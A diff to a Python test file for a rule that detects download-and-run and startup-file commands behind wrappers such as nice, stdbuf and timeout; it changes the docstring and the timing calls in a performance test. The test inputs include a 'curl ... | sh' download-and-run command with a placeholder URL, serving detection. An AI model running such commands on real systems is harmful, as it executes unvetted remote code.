@@ -1,4 +1,4 @@
-"""B-2216: the download-and-run and startup-file rules unwrap the same wrappers (stdbuf, nice, ionice, timeout, env, command ...).
+"""The download-and-run and startup-file rules unwrap the same wrappers (stdbuf, nice, ionice, timeout, env, command ...).
 Mirrors packages/zn-gate/test/destructive_wrappers.test.js. Only fake example.com URLs and example paths; nothing is run."""
 import time
 
@@ -64,9 +64,9 @@ def test_twin_allowed(cmd):
 def test_200kb_wrappers_stay_linear():
     unit = f"stdbuf -o0 nice -n 5 timeout -s KILL 5 curl {DL} -o install.sh; "
     big = unit * ((200 * 1024 - 8) // len(unit))
-    t0 = time.perf_counter()
+    t0 = time.process_time()
     rule(big)
-    assert time.perf_counter() - t0 < 3.0
-    t1 = time.perf_counter()
+    assert time.process_time() - t0 < 3.0
+    t1 = time.process_time()
     rule("nice " * 40000 + f"curl {DL} | sh")
-    assert time.perf_counter() - t1 < 3.0
+    assert time.process_time() - t1 < 3.0
